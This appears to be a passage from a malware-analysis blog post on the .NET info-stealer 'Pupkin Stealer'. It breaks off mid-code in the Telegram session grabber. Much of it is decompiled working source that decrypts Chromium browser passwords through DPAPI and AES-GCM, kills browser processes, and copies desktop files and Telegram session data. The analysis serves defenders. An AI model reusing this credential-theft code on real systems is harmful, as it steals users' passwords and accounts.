---
title: "Pupkin: A Simple .NET Info-Stealer Exfiltrating Data via Telegram"
date: 2025-04-29T11:34:30-04:00
categories:
  - Blog
tags:
  - Info-Stealer
  - PupkinStealer
  - Analysis
---
***Pupkin Stealer** is a deceptively simple .NET-based stealer designed to harvest browser passwords, Discord tokens, and Telegram sessions — all controlled silently through a Telegram C2.*

## Contents

- [Introduction](#introduction)
- [Stage 0: File Info](#stage-0-file-info)
- [Stage 1: Basic Overview](#stage-1-basic-overview)
- [Stage 2: Main{}](#stage-2-main)
- [Stage 3: Chromium](#stage-3-chromium)
- [Stage 4: FunctionsForStealer](#stage-4-functionsforstealer)
- [Stage 5: GrabberDesktop](#stage-5-grabberdesktop)
- [Stage 6: Grabber Telegram Session](#stage-6-grabber-telegram-session)
- [Stage 7: Grabber Discord Session](#stage-7-grabber-discord-session)
- [Stage 8: File Manager](#stage-8-file-manager)
- [Stage 9: Data Dispatch](#stage-9-data-dispatch)
- [Stage 10: Telegram Bot Analysis](#stage-10-telegram-bot-analysis)
- [Variables](#variables)
- [High-Level Execution Flow Chart](#high-level-execution-flow-chart)
- [Indicators of Compromise](#indicators-of-compromise-iocs)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Attribution](#attribution)
- [Executive Summary](#Executive-Summary)
- [YARA Rule](#yara-rule)
- [References](#references)

# Introduction

I recently came across a .NET-based info-stealer that caught my eye. Pupkin Stealer is surprisingly slick for how simple it is, avoiding fancy evasion tricks or heavy code masking. It just gets to work, running several tasks at once to grab sensitive data and send it off through Telegram. But a few rookie mistakes in the code, show it’s likely the work of someone new to the scene.
While it resembles Malware-as-a-Service (MaaS) due to its structured data theft, there's no clear evidence it’s offered as a service. It’s more a "try-hard" attempt at a functional stealer than a true MaaS product.

When it’s running, Pupkin goes after:

- Passwords saved in Chromium browsers
- Active Telegram session files
- Discord login tokens
- Full screenshots of the desktop
- Files sitting on the user’s desktop

This analysis breaks down how Pupkin operates, shines a light on its key tactics, and explains why even basic info-stealers like this are still a real threat. Clues in the code and Telegram data point to a Russian-speaking developer behind it, going by the name “Ardent.”



# Stage 0: File Info

- **File Name:** PupkinStealer.exe // PlutoniumLoader.exe
- **File Type:** .NET Executable (Windows PE, Win32 EXE)
- **File Size:** 6.21 MB
- **SHA-256:** `9309003c245f94ba4ee52098dadbaa0d0a4d83b423d76c1bfc082a1c29e0b95f`
- **Delivery Method:** Unknown (likely distributed through phishing attachments or cracked software packages)
- **First seen on VT:** 2025-04-20

# Stage 1: Basic Overview

![image.png](/assets/images/blog2/die1.png)

First, I dropped the file into **Detect It Easy (DIE)** to gather initial information about the binary.

The first observation: DIE suggested that the binary is **obfuscated and packed**. To validate this claim, I immediately checked the **entropy** levels for more clarity.

### Entropy Analysis:

![image.png](/assets/images/blog2/die2.png)

- **Overall PE32 File Entropy**: 7.99810 → Marked as “packed (99%)”
- **Section-wise Entropy**:
    - **PE Header**: 2.76464 → Normal, not packed
    - **.text**: 7.99618 → Very high entropy, likely compressed or encrypted
    - **.rsrc**: 4.12568 → Normal for a resource section
    - **.reloc**: 0.10473 → Very low entropy, expected for relocation data

### Initial Conclusion:

At first glance, the binary appears **packed** due to the very high entropy, especially within the `.text` section. However, when I attempted to load it into **dnSpy**, the binary was **easily decompiled** without any unpacking or memory dumping.

This behavior suggested that the binary was **not truly packed or obfuscated** in a malicious sense.

Further digging revealed the likely cause: **Costura.Fody**.

Costura.Fody is a common .NET tool that embeds dependent DLLs directly into the executable. It compresses these embedded assemblies into the .text section, which naturally inflates the file's entropy.

As a result, the file appears "packed" to entropy-based detectors, but is fully functional and readable by the .NET runtime at execution.

# Stage 2: Main{}

```csharp
using System;
using System.Threading.Tasks;
using Browsers;
using Grabbers;
using Messengers;
using Senders;
using SystemInfo;

namespace Main
{
	// Token: 0x02000010 RID: 16
	internal class ExecutionCore
	{
		// Token: 0x06000025 RID: 37 RVA: 0x00003680 File Offset: 0x00001880
		private static void Main(string[] args)
		{
			Task task = Task.Run(delegate
			{
				Chromium.ChromiumPasswords.DecryptingBrowsersPasswords();
			});
			Task task2 = Task.Run(delegate
			{
				Desktop.GrabberDesktop();
			});
			Task task3 = Task.Run(delegate
			{
				Telegram.GrabberTelegramSession();
			});
			Task task4 = Task.Run(delegate
			{
				Discord.GrabberDiscordToken();
			});
			Task task5 = Task.Run(delegate
			{
				Screenshot.GrabberScreenshot();
			});
			Task.WaitAll(new Task[] { task, task2, task3, task4, task5 });
			DataDispatch.ZipCompression();
			DataDispatch.Dispatch(Variables.ID);
		}
	}
}
```

When the info stealer is launched, the first thing `Main{}` executes is multiple asynchronous tasks concurrently to collect sensitive data from different sources:

- Decrypting saved passwords from Chromium-based browsers.
- Grabbing desktop information (system details or user activities).
- Extracting Telegram session data.
- Retrieving Discord tokens.
- Capturing screenshots of the user's screen.

Once all tasks are complete, the collected data is compressed into a zip file and then dispatched to exfiltrate the data.

Let's analyse each function used by the Pupkin stealer step by step:

# Stage 3: Chromium

```csharp
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Helpers;
using Main;

namespace Browsers
{
    public class Chromium
    {
        public class ChromiumPasswords
        {
            public static void DecryptingBrowsersPasswords()
            {
                Directory.CreateDirectory(Variables.temp + Variables.username + "\\Passwords");

                if (File.Exists(Variables.LoginDataPathOperaGX))
                {
                    DecryptBrowserPasswords(Variables.LoginDataPathOperaGX, FunctionsForStealer.LocalStateKeys.GetKeyOperaGX(), "OperaGX.txt", "operagx", out Variables.isOperaGXFound, out Variables.foundOperaGXPasswords);
                }

                if (File.Exists(Variables.LoginDataPathOpera))
                {
                    DecryptBrowserPasswords(Variables.LoginDataPathOpera, FunctionsForStealer.LocalStateKeys.GetKeyOpera(), "Opera.txt", "opera", out Variables.isOperaFound, out Variables.foundOperaPasswords);
                }

                if (File.Exists(Variables.LoginDataPathChrome))
                {
                    DecryptBrowserPasswords(Variables.LoginDataPathChrome, FunctionsForStealer.LocalStateKeys.GetKeyChrome(), "Chrome.txt", "chrome", out Variables.isChromeFound, out Variables.foundChromePasswords);
                }

                if (File.Exists(Variables.LoginDataPathEdge))
                {
                    DecryptBrowserPasswords(Variables.LoginDataPathEdge, FunctionsForStealer.LocalStateKeys.GetKeyEdge(), "Edge.txt", "edge", out Variables.isEdgeFound, out Variables.foundEdgePasswords);
                }

                if (File.Exists(Variables.LoginDataPathVivaldi))
                {
                    DecryptBrowserPasswords(Variables.LoginDataPathVivaldi, FunctionsForStealer.LocalStateKeys.GetKeyVivaldi(), "Vivaldi.txt", "vivaldi", out Variables.isVivaldiFound, out Variables.foundVivaldiPasswords);
                }
            }

            public static void DecryptBrowserPasswords(string pathToLoginData, byte[] localState, string nameTxt, string nameBrowser, out string isFoundBrowser, out int foundPasswordsThisBrowser)
            {
                foundPasswordsThisBrowser = 0;

                try
                {
                    ProcessBrowserKill(nameBrowser);
                    string content = "";
                    string connectionString = $"Data Source={pathToLoginData};Version=3;";
                    using (SQLiteConnection sqliteConnection = new SQLiteConnection(connectionString))
                    {
                        sqliteConnection.Open();
                        List<StolenDataFromBrowser> passwords = new List<StolenDataFromBrowser>();
                        using (SQLiteCommand sqliteCommand = new SQLiteCommand("select * from logins", sqliteConnection))
                        {
                            using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
                            {
                                while (sqliteDataReader.Read())
                                {
                                    byte[] encryptedPassword = (byte[])sqliteDataReader["password_value"];
                                    if (FunctionsForStealer.FunctionsForDecrypt.IsV10(encryptedPassword))
                                    {
                                        byte[] iv, salt;
                                        FunctionsForStealer.FunctionsForDecrypt.Prepare(encryptedPassword, out iv, out salt);
                                        string decryptedPassword = FunctionsForStealer.FunctionsForDecrypt.Decrypt(salt, localState, iv);

                                        if (!string.IsNullOrEmpty(decryptedPassword))
                                        {
                                            Variables.allFoundPasswords++;
                                            foundPasswordsThisBrowser++;
                                            passwords.Add(new StolenDataFromBrowser
                                            {
                                                url = sqliteDataReader["origin_url"].ToString(),
                                                username = sqliteDataReader["username_value"].ToString(),
                                                password = decryptedPassword
                                            });
                                        }
                                    }
                                    else
                                    {
                                        try
                                        {
                                            Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));
                                        }
                                        catch { }
                                    }
                                }
                            }
                        }

                        if (File.Exists(Variables.temp + Variables.username + "\\Passwords\\" + nameTxt))
                        {
                            File.Delete(Variables.temp + Variables.username + "\\Passwords\\" + nameTxt);
                        }

                        foreach (StolenDataFromBrowser password in passwords)
                        {
                            content += $"URL: {password.url}\r\nLogin: {password.username}\r\nPassword: {password.password}\r\n\r\n";
                            File.WriteAllText(Variables.temp + Variables.username + "\\Passwords\\" + nameTxt, content);
                        }
                    }
                    isFoundBrowser = $"Found {nameBrowser}!";
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message + " // " + nameBrowser);
                    isFoundBrowser = ex.Message;
                }
            }

            public static void ProcessBrowserKill(string nameBrowser)
            {
                try
                {
                    Process[] processes = Process.GetProcessesByName(nameBrowser);
                    if (processes.Length > 0)
                    {
                        foreach (Process process in processes)
                        {
                            process.Kill();
                            process.WaitForExit();
                        }
                    }
                }
                catch { }
            }
        }
    }
}
```

This code defines a `ChromiumPasswords` class inside the `Browsers` namespace.

It’s built to **extract and decrypt saved passwords** from Chromium-based browsers (like Chrome, OperaGX, Edge, Vivaldi, etc.).

Let’s walk through it:

### **DecryptingBrowsersPasswords**

- Creates a `Passwords` directory under `Variables.temp + Variables.username`.
- Checks if each browser’s `Login Data` file exists (paths like `Variables.LoginDataPathOperaGX`, etc.).
- If the file exists, calls `DecryptBrowserPasswords` with:
    - File path to the database
    - Decryption key from `FunctionsForStealer.LocalStateKeys`
    - Output file name
    - Browser name
    - Variables to track password counts
- Processes all supported browsers individually.
- Results are saved into separate text files per browser.

---

### **DecryptBrowserPasswords**

- Calls `ProcessBrowserKill` to terminate running browser instances.
- Connects to the `Login Data` SQLite database.
- Queries the `logins` table to fetch stored credentials.
- For each login entry:
    - Checks if the encrypted password uses "v10" format with `FunctionsForStealer.FunctionsForDecrypt.IsV10`.
    - If "v10":
        - Prepares nonce and ciphertext using `Prepare`.
        - Decrypts password using `Decrypt` with provided local state key.
- Valid decrypted credentials (URL, username, password) are added to a list.
- Increments `Variables.allFoundPasswords` and `foundPasswordsThisBrowser` counters.
- Writes the credentials into a browser-specific text file (overwriting any existing file).
- Updates `isFoundBrowser` flag based on success or exception caught.

---

### **ProcessBrowserKill**

- Searches for running processes matching the browser's process name.
- Terminates each matched process.
- Waits for the process to fully exit.
- Silently ignores any access or kill errors.

# Stage 4:  FunctionsForStealer

```csharp
using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Main;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Helpers
{
	internal class FunctionsForStealer
	{
		public class LocalStateKeys
		{
			public static byte[] GetKeyChrome()
			{
				string text = Variables.localappdata + "\\Google\\Chrome\\User Data\\Local State";
				string text2 = File.ReadAllText(text);
				object obj = JsonConvert.DeserializeObject(text2);
				if (FunctionsForStealer.LocalStateKeys.<>o__0.<>p__2 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__0.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FunctionsForStealer.LocalStateKeys)));
				}
				Func<CallSite, object, string> target = FunctionsForStealer.LocalStateKeys.<>o__0.<>p__2.Target;
				CallSite <>p__ = FunctionsForStealer.LocalStateKeys.<>o__0.<>p__2;
				if (FunctionsForStealer.LocalStateKeys.<>o__0.<>p__1 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__0.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = FunctionsForStealer.LocalStateKeys.<>o__0.<>p__1.Target;
				CallSite <>p__2 = FunctionsForStealer.LocalStateKeys.<>o__0.<>p__1;
				if (FunctionsForStealer.LocalStateKeys.<>o__0.<>p__0 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				string text3 = target(<>p__, target2(<>p__2, FunctionsForStealer.LocalStateKeys.<>o__0.<>p__0.Target(FunctionsForStealer.LocalStateKeys.<>o__0.<>p__0, obj)));
				byte[] array = Convert.FromBase64String(text3).Skip(5).ToArray<byte>();
				return ProtectedData.Unprotect(array, null, DataProtectionScope.LocalMachine);
			}

			// Token: 0x0600001C RID: 28 RVA: 0x00003124 File Offset: 0x00001324
			public static byte[] GetKeyOpera()
			{
				string text = Variables.roamingappdata + "\\Opera Software\\Opera Stable\\Local State";
				string text2 = File.ReadAllText(text);
				object obj = JsonConvert.DeserializeObject(text2);
				if (FunctionsForStealer.LocalStateKeys.<>o__1.<>p__2 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__1.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FunctionsForStealer.LocalStateKeys)));
				}
				Func<CallSite, object, string> target = FunctionsForStealer.LocalStateKeys.<>o__1.<>p__2.Target;
				CallSite <>p__ = FunctionsForStealer.LocalStateKeys.<>o__1.<>p__2;
				if (FunctionsForStealer.LocalStateKeys.<>o__1.<>p__1 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__1.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = FunctionsForStealer.LocalStateKeys.<>o__1.<>p__1.Target;
				CallSite <>p__2 = FunctionsForStealer.LocalStateKeys.<>o__1.<>p__1;
				if (FunctionsForStealer.LocalStateKeys.<>o__1.<>p__0 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__1.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				string text3 = target(<>p__, target2(<>p__2, FunctionsForStealer.LocalStateKeys.<>o__1.<>p__0.Target(FunctionsForStealer.LocalStateKeys.<>o__1.<>p__0, obj)));
				byte[] array = Convert.FromBase64String(text3).Skip(5).ToArray<byte>();
				return ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser);
			}

			// Token: 0x0600001D RID: 29 RVA: 0x00003254 File Offset: 0x00001454
			public static byte[] GetKeyOperaGX()
			{
				string text = Variables.roamingappdata + "\\Opera Software\\Opera GX Stable\\Local State";
				string text2 = File.ReadAllText(text);
				object obj = JsonConvert.DeserializeObject(text2);
				if (FunctionsForStealer.LocalStateKeys.<>o__2.<>p__2 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__2.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FunctionsForStealer.LocalStateKeys)));
				}
				Func<CallSite, object, string> target = FunctionsForStealer.LocalStateKeys.<>o__2.<>p__2.Target;
				CallSite <>p__ = FunctionsForStealer.LocalStateKeys.<>o__2.<>p__2;
				if (FunctionsForStealer.LocalStateKeys.<>o__2.<>p__1 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__2.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = FunctionsForStealer.LocalStateKeys.<>o__2.<>p__1.Target;
				CallSite <>p__2 = FunctionsForStealer.LocalStateKeys.<>o__2.<>p__1;
				if (FunctionsForStealer.LocalStateKeys.<>o__2.<>p__0 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__2.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				string text3 = target(<>p__, target2(<>p__2, FunctionsForStealer.LocalStateKeys.<>o__2.<>p__0.Target(FunctionsForStealer.LocalStateKeys.<>o__2.<>p__0, obj)));
				byte[] array = Convert.FromBase64String(text3).Skip(5).ToArray<byte>();
				return ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser);
			}

			// Token: 0x0600001E RID: 30 RVA: 0x00003384 File Offset: 0x00001584
			public static byte[] GetKeyEdge()
			{
				string text = Variables.localappdata + "\\Microsoft\\Edge\\User Data\\Local State";
				string text2 = File.ReadAllText(text);
				object obj = JsonConvert.DeserializeObject(text2);
				if (FunctionsForStealer.LocalStateKeys.<>o__3.<>p__2 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__3.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FunctionsForStealer.LocalStateKeys)));
				}
				Func<CallSite, object, string> target = FunctionsForStealer.LocalStateKeys.<>o__3.<>p__2.Target;
				CallSite <>p__ = FunctionsForStealer.LocalStateKeys.<>o__3.<>p__2;
				if (FunctionsForStealer.LocalStateKeys.<>o__3.<>p__1 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__3.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = FunctionsForStealer.LocalStateKeys.<>o__3.<>p__1.Target;
				CallSite <>p__2 = FunctionsForStealer.LocalStateKeys.<>o__3.<>p__1;
				if (FunctionsForStealer.LocalStateKeys.<>o__3.<>p__0 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__3.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				string text3 = target(<>p__, target2(<>p__2, FunctionsForStealer.LocalStateKeys.<>o__3.<>p__0.Target(FunctionsForStealer.LocalStateKeys.<>o__3.<>p__0, obj)));
				byte[] array = Convert.FromBase64String(text3).Skip(5).ToArray<byte>();
				return ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser);
			}

			// Token: 0x0600001F RID: 31 RVA: 0x000034B4 File Offset: 0x000016B4
			public static byte[] GetKeyVivaldi()
			{
				string text = Variables.localappdata + "\\Vivaldi\\User Data\\Local State";
				string text2 = File.ReadAllText(text);
				object obj = JsonConvert.DeserializeObject(text2);
				if (FunctionsForStealer.LocalStateKeys.<>o__4.<>p__2 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__4.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(FunctionsForStealer.LocalStateKeys)));
				}
				Func<CallSite, object, string> target = FunctionsForStealer.LocalStateKeys.<>o__4.<>p__2.Target;
				CallSite <>p__ = FunctionsForStealer.LocalStateKeys.<>o__4.<>p__2;
				if (FunctionsForStealer.LocalStateKeys.<>o__4.<>p__1 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__4.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				Func<CallSite, object, object> target2 = FunctionsForStealer.LocalStateKeys.<>o__4.<>p__1.Target;
				CallSite <>p__2 = FunctionsForStealer.LocalStateKeys.<>o__4.<>p__1;
				if (FunctionsForStealer.LocalStateKeys.<>o__4.<>p__0 == null)
				{
					FunctionsForStealer.LocalStateKeys.<>o__4.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(FunctionsForStealer.LocalStateKeys), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
				}
				string text3 = target(<>p__, target2(<>p__2, FunctionsForStealer.LocalStateKeys.<>o__4.<>p__0.Target(FunctionsForStealer.LocalStateKeys.<>o__4.<>p__0, obj)));
				byte[] array = Convert.FromBase64String(text3).Skip(5).ToArray<byte>();
				return ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser);
			}
		}

		public class FunctionsForDecrypt
		{
	
			public static bool IsV10(byte[] data)
			{
				return Encoding.UTF8.GetString(data.Take(3).ToArray<byte>()) == "v10";
			}

			
			public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
			{
				nonce = new byte[12];
				ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];
				Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
				Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
			}

		
			public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
			{
				string text = string.Empty;
				try
				{
					GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
					AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, iv, null);
					gcmBlockCipher.Init(false, aeadParameters);
					byte[] array = new byte[gcmBlockCipher.GetOutputSize(encryptedBytes.Length)];
					int num = gcmBlockCipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, array, 0);
					gcmBlockCipher.DoFinal(array, num);
					text = Encoding.UTF8.GetString(array).TrimEnd("\r\n\0".ToCharArray());
				}
				catch (Exception ex)
				{
					Console.WriteLine("from Decrypt!: " + ex.Message);
				}
				return text;
			}
		}
	}
}

```

The code is in a namespace called **Helpers** and has a class **FunctionsForStealer** with two nested classes: **LocalStateKeys** and **FunctionsForDecrypt**. These classes are all about:

- Fetch encryption keys from browser files.
- Use those keys to decrypt sensitive data stored by the browsers.

The overall goal is to bypass the encryption protecting browser data, which is typically locked up using methods tied to the OS or the browser's own mechanisms.

### LocalStateKeys Class

This class is responsible for pulling the encryption keys from the "Local State" files of different browsers. You need these keys to decrypt any stored data from the browser.

- Every browser has a "Local State" file, usually stored in a specific folder. For example, Chrome's is located at `%LocalAppData%\Google\Chrome\User Data\Local State`.
- This file is a JSON, so the code uses **Newtonsoft.Json** to read and convert it into an object.
- The important part is a field called **os_crypt.encrypted_key**, which contains the encrypted encryption key in Base64 format.
- The key is decoded first, and the first 5 bytes (a prefix) are discarded. Then, the remaining key is decrypted using **Windows ProtectedData.Unprotect**, which leverages Windows' DPAPI system to decrypt it. The decryption context depends on the browser – it could be tied to the local machine or the current user.
- After decryption, the key is returned as a byte array, which is ready to be used for decrypting the actual browser data.

Each browser has its own method to retrieve its key:

- **GetKeyChrome()** for Chrome.
- **GetKeyOpera()** for Opera.
- **GetKeyOperaGX()** for Opera GX.
- **GetKeyEdge()** for Edge.
- **GetKeyVivaldi()** for Vivaldi.

A couple of technical things to keep in mind:

- The code uses **dynamic runtime binding** to access JSON properties, which makes the code more flexible but also harder to read.
- The encryption key is protected by DPAPI, so the code needs to run with the correct context—whether tied to the user or the machine.

### FunctionsForDecrypt Class

This class does the actual decryption using the keys fetched by **LocalStateKeys**. The encrypted data being worked on here is generally protected with **AES-GCM**, a common encryption method in modern browsers.

- **IsV10**: This method checks if the encrypted data starts with the "v10" prefix, which indicates it's using a specific encryption format that’s common in Chromium-based browsers.
- **Prepare**: This method takes the encrypted data and splits it into two parts:
    1. The **nonce** (a 12-byte number that is used only once).
    2. The **ciphertext** (the encrypted data) along with an **authentication tag**.
    
    This step is essentially about breaking the encrypted data into manageable chunks so it can be properly decrypted.
    
- **Decrypt**: This is where the magic happens. The method uses the **BouncyCastle** library to decrypt the data with the AES-GCM algorithm.

**BouncyCastle is a cryptography library that provides a wide range of cryptographic operations**

    - The decrypted data is then converted into a string (usually passwords, cookies, etc.), and any unnecessary characters like null values or newlines are cleaned up.
    - If something goes wrong (e.g., if the wrong key is used or the data is corrupted), the method catches the error and returns an empty string instead of crashing.

# Stage 5: **GrabberDesktop**

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using Main;

namespace Grabbers
{
	// Token: 0x02000014 RID: 20
	public class Desktop
	{
		// Token: 0x06000037 RID: 55 RVA: 0x000039AC File Offset: 0x00001BAC
		public static void GrabberDesktop()
		{
			try
			{
				Directory.CreateDirectory(Variables.workdir + "\\Grabbers\\DesktopFiles");
				string[] files = Directory.GetFiles(Variables.desktop);
				List<string> list = new List<string>();
				foreach (string text in files)
				{
					string extension = Path.GetExtension(text);
					bool flag = extension == ".pdf" || extension == ".txt" || extension == ".sql" || extension == ".jpg" || extension == ".png";
					if (flag)
					{
						Variables.foundFilesFromDesktop++;
						list.Add(text);
					}
				}
				List<string> list2 = new List<string>();
				foreach (string text2 in list)
				{
					list2.Add(Path.GetFileName(text2));
				}
				for (int j = 0; j < list.Count; j++)
				{
					bool flag2 = File.Exists(Path.Combine(Variables.workdir + "\\Grabbers\\DesktopFiles", list2[j]));
					if (flag2)
					{
						File.Delete(Path.Combine(Variables.workdir + "\\Grabbers\\DesktopFiles", list2[j]));
					}
					File.Copy(list[j], Path.Combine(Variables.workdir + "\\Grabbers\\DesktopFiles", list2[j]));
				}
			}
			catch
			{
			}
		}
	}
}
```

`GrabberDesktop` function:

- Creates a target directory at `Variables.workdir\Grabbers\DesktopFiles` if it doesn't exist.
- Scans all files located on the user’s desktop (`Variables.desktop`).
- Filters and selects files that have `.pdf`, `.txt`, `.sql`, `.jpg`, or `.png` extensions.
- Increments `Variables.foundFilesFromDesktop` for each matching file found.
- Extracts filenames (without path) into a second list to prepare for copying.
- Before copying, checks if a file with the same name already exists at the destination:
    - If it does, deletes the existing file to prevent overwriting issues.
- Copies each selected file from the desktop to the `DesktopFiles` directory.
- Silently handles any exceptions via a `try-catch` block — no error reporting or logging.

# Stage 6: Grabber Telegram sesssion

```csharp
using System;
using System.Diagnostics;
using System.IO;
using Main;

namespace Messengers
{
	// Token: 0x02000005 RID: 5
	public class Telegram
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002864 File Offset: 0x00000A64
		public static void GrabberTelegramSession()
		{
			string text = Telegram.SearchPathTelegram();
			try
			{
				Telegram.TelegramProcessKill(ref text);
				bool flag = text == "Not Found!";
				if (!flag)
				{
					Variables.telegramSessionFound = "Found! Success";
					Directory.CreateDirectory(Variables.workdir + "\\Grabbers\\TelegramSession");
					string text2 = Variables.workdir + "\\Grabbers\\TelegramSession";
					string text3 = text;
					foreach (string text4 in Directory.GetFiles(text3))
					{
						bool flag2 = File.Exists(text2 + "\\" + Path.GetFileName(text4));
						if (flag2)
						{
							File.Delete(text2 + "\\" + Path.GetFileName(text4));
						}
						File.Copy(text4, text2 + "\\" + Path.GetFileName(text4));
					}
					foreach (string text5 in Directory.GetDirectories(text3))
					{
						string text6 = text2 + "\\" + text5.Split(new char[] { '\\' })[text5.Split(new char[] { '\\' }).Length - 1];
						Directory.CreateDirectory(text6);
						foreach (string text7 in Directory.GetFiles(text5))
						{
							bool flag3 = File.Exists(text6 + "\\" + Path.GetFileName(text7));
							if (flag3)
							{
								File.Delete(text6 + "\\" + Path.GetFileName(text7));
							}
							File.Copy(text7, text6 + "\\" + Path.GetFileName(text7));
						}
					}
				}
			}
			catch (Exception ex)
			{
				Variables.telegramSessionFound = "ERR: " + ex.Message;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002A58 File Offset: 0x00000C58
		private static void TelegramProcessKill(ref string pathToTelegram)
		{
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			bool flag = processesByName.Length != 0;
			if (flag)
			{
				bool flag2 = pathToTelegram == "Not Found!";
				if (flag2)
				{
					pathToTelegram = processesByName[0].MainModule.FileName;
					string text = pathToTelegram.Remove(pathToTelegram.Length - 13, 13);
					pathToTelegram = text + "\\tdata";
				}
				processesByName[0].Kill();
				processesByName[0].WaitForExit();
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002AD0 File Offset: 0x00000CD0
		private static string GetPathByLnk()
		{
			string text2;
			try
			{
				string text = Variables.desktop + "\\Telegram.lnk";
				FileInfo fileInfo = new FileInfo(text);
				using (FileStream fileStream = File.Open(fileInfo.FullName, FileMode.Open, FileAccess.Read))
				{
					using (BinaryReader binaryReader = new BinaryReader(fileStream))
					{
						fileStream.Seek(20L, SeekOrigin.Begin);
						uint num = binaryReader.ReadUInt32();
						bool flag = (num & 1U) == 1U;
						if (flag)
						{
							fileStream.Seek(76L, SeekOrigin.Begin);
							ushort num2 = binaryReader.ReadUInt16();
